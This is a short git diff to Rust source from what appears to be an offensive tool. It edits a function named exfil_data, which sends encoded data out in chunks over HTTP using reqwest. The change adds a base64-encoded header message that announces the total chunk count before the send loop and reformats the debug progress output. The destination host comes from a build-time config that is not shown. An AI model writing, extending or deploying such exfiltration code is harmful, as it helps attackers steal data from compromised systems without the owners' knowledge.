@@ -3,6 +3,7 @@ use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
 use std::time::Duration;
 use std::cmp::min;
 use random_string::{charsets::ALPHA_LOWER, generate};
+use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
 
 mod config {
     include!(concat!(env!("OUT_DIR"), "/config.rs"));
@@ -44,15 +45,19 @@ pub async fn exfil_data(encoded_data: &str) -> Result<(), Box<dyn Error>> {
 
     let mut start = 0;
     let mut chunk_num = 1;
+    let total_chunks = encoded_data.len() / CHUNK_SIZE + 1;
+
+    #[cfg(feature = "debug")]
+    println!("[*] Sending header payload");
+    send_data(&client, &format!("{}.0.{}", URL_SAFE_NO_PAD.encode(&format!("json;{}", total_chunks)), id)).await?;
 
     loop {
         let end = min(start + CHUNK_SIZE, encoded_data.len());
         let chunk = &encoded_data[start..end];
-        let total_chunks = encoded_data.len() / CHUNK_SIZE + 1;
 
         #[cfg(feature = "debug")] {
             use std::io::{Write, stdout};
-            print!("\r[*] Sending chunk [{:02}/{}]", chunk_num, total_chunks);
+            print!("\r[*] Sending chunk [{:03}/{:03}]", chunk_num, total_chunks);
             stdout().flush().unwrap();
         }
 
